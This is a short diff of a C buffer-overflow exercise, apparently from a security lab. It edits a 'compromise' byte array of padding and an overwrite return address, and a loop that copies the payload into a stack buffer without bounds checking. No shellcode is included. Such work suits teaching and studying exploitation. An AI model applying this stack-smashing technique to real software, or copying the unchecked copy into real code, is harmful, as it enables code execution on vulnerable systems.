@@ -66,7 +66,7 @@ char compromise[159] = {
 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                   //dq 0xffffffffffffffff
 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                   //dq 0xffffffffffffffff
 
-0x30,0xe2,0xff,0xff,
+0xe0,0xdf,0xff,0xff,
 0xff,0x7f,0x00,    //newAddr:   dd newAddr-start
 
 };
@@ -96,8 +96,8 @@ void doTest(){
        string onto the stack
        - change compromise1 to compromise
          when shell code is written */
-    for (i = 0; compromise[i]; i++){
-	buffer[i] = compromise[i];
+    for (i = 0; compromise1[i]; i++){
+	buffer[i] = compromise1[i];
     }
 }
 
